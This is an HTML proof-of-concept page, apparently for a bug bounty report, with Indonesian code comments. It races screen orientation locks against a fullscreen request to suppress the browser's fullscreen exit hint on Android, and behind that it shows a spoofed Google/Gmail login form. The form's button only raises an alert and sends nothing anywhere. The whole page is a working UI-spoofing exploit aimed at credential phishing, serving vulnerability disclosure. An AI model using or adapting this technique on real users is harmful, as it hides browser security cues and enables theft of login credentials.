<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC v3a - Orientation Race</title>
    <style>
        body, html { margin: 0; padding: 0; overflow: hidden; background: #202124; font-family: 'Segoe UI', sans-serif; }
        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
        #payload { display: none; color: white; text-align: center; padding-top: 10vh; }
        .warning-header { color: #ff4444; font-size: 1.2rem; margin-bottom: 20px; border-bottom: 1px solid #444; padding-bottom: 10px; }
        .login-box { background: white; color: #202124; width: 85vw; max-width: 380px; margin: 0 auto; padding: 32px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        button.login-btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; font-size: 16px; }
        #initial-ui { position: relative; z-index: 100; text-align: center; color: #0f0; padding-top: 15vh; padding: 40px; }
        .attack-btn { padding: 30px 40px; font-size: 22px; cursor: pointer; background: #111; color: #0f0; border: 5px double #0f0; border-radius: 8px; margin-top: 30px; }
        #log { position: fixed; bottom: 60px; left: 8px; color: #0f0; font-size: 11px; font-family: monospace; z-index: 9999; background: rgba(0,0,0,0.8); padding: 8px 10px; border-radius: 4px; display: none; max-width: 92vw; line-height: 1.6; }
        .variant-tag { position: fixed; top: 10px; right: 10px; background: #9c27b0; color: white; padding: 4px 10px; border-radius: 4px; font-size: 12px; font-family: monospace; z-index: 9999; }
    </style>
</head>
<body>
    <canvas id="glCanvas"></canvas>
    <div class="variant-tag">v3a: Orientation Race</div>

    <div id="initial-ui">
        <h2 style="color:#aaa;font-size:13px;margin-bottom:4px;">VECTOR A — ISOLATED TEST</h2>
        <h1 style="font-size:22px;">Orientation Change Race</h1>
        <p style="color:#aaa;font-size:13px;">
            Paksa screen.orientation.lock() tepat saat fullscreen enter.<br>
            <b style="color:#ff0;">Target:</b> interrupt InfoBarContainer render cycle via onConfigurationChanged()
        </p>
        <button id="go" class="attack-btn">LAUNCH v3a</button>
    </div>

    <div id="payload">
        <div class="warning-header">** (Bug Bounty) v3a: Orientation Race **</div>
        <div class="login-box">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92" alt="Google">
            <h3 style="margin:16px 0 4px;">POC</h3>
            <p style="margin:0 0 16px;color:#555;">Gmail</p>
            <input type="text" placeholder="Email" autocomplete="off">
            <input type="password" placeholder="Password">
            <button class="login-btn" onclick="alert('v3a PoC Success')">Next</button>
        </div>
    </div>

    <div id="log"></div>

    <script>
        const btn = document.getElementById('go');
        const initialUI = document.getElementById('initial-ui');
        const payload = document.getElementById('payload');
        const log = document.getElementById('log');

        function addLog(msg) {
            log.style.display = 'block';
            log.innerHTML += `[${performance.now().toFixed(0)}ms] ${msg}<br>`;
        }

        btn.onclick = async () => {
            initialUI.style.display = 'none';
            payload.style.display = 'block';

            const t0 = performance.now();
            addLog('Click registered');

            // Step 1: Pre-lock orientation ke portrait sebelum FS
            // Ini memastikan saat kita lock ke landscape nanti, ada config change nyata
            try {
                await screen.orientation.lock('portrait');
                addLog('Pre-lock portrait OK');
            } catch(e) {
                addLog('Pre-lock failed (expected on some devices): ' + e.message);
            }

            // Step 2: requestFullscreen
            addLog('Requesting fullscreen...');
            const fsPromise = document.documentElement.requestFullscreen();

            // Step 3: RACE — paksa orientation change SERENTAK dengan fullscreen enter
            // onConfigurationChanged() di Android akan fire dan interrupt
            // InfoBarContainer layout pass yang sedang prepare hint
            const orientPromise = (async () => {
                // Tidak await fsPromise dulu — fire orientation change SEGERA
                // untuk race dengan fullscreen transition
                try {
                    // Toggle ke landscape — paksa onConfigurationChanged
                    await screen.orientation.lock('landscape');
                    addLog('Orientation locked: landscape');

                    // Kemudian balik lagi ke portrait untuk second config change
                    // Double config change = double interrupt pada hint render
                    await new Promise(r => setTimeout(r, 80));
                    await screen.orientation.lock('portrait');
                    addLog('Orientation locked back: portrait');

                    // Ketiga — unlock untuk natural orientation
                    await new Promise(r => setTimeout(r, 80));
                    screen.orientation.unlock();
                    addLog('Orientation unlocked');
                } catch(e) {
                    addLog('Orientation race failed: ' + e.message);
                }
            })();

            // Step 4: Await fullscreen resolved
            try {
                await fsPromise;
                addLog(`Fullscreen resolved: ${(performance.now() - t0).toFixed(2)}ms`);
            } catch(e) {
                addLog('FS error: ' + e);
            }

            await orientPromise;
            addLog(`Total elapsed: ${(performance.now() - t0).toFixed(2)}ms`);

            // Step 5: Listen fullscreenchange untuk timing data
            document.addEventListener('fullscreenchange', () => {
                if (document.fullscreenElement) {
                    addLog(`fullscreenchange fired: ${(performance.now() - t0).toFixed(2)}ms`);
                }
            }, { once: true });
        };
    </script>
</body>
</html>
